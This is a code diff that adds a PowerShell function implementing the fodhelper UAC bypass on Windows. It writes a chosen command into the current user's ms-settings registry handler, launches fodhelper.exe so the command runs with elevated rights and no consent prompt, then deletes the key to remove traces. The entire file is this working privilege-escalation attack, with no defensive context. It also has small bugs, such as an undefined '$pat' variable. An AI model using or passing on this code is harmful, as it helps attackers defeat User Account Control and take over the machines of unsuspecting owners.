@@ -1,0 +1,27 @@
+function invoke-fodhelper{ 
+    Param (    
+    $instruction = "powershell.exe" 
+        )
+    
+    $path = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
+    $key = "DelegateExecute" 
+    
+    # Creating path
+    if(-not(Test-Path -Path $path))
+    {
+        printMessage -message  "Path doesn't exist"
+        printMessage -message  "Creating path"
+        New-Item $pat -Force
+    }
+
+    # Registry values
+    New-ItemProperty -Path $path -Name $key -Value $instruction -Force
+    Set-ItemProperty -Path $path -Name "(default)" -Value $instruction -Force
+    
+
+    Start "fodhelper.exe" 
+    
+    # Removing
+    Sleep 2
+    Remove-Item $path -Recurse -Force
+}
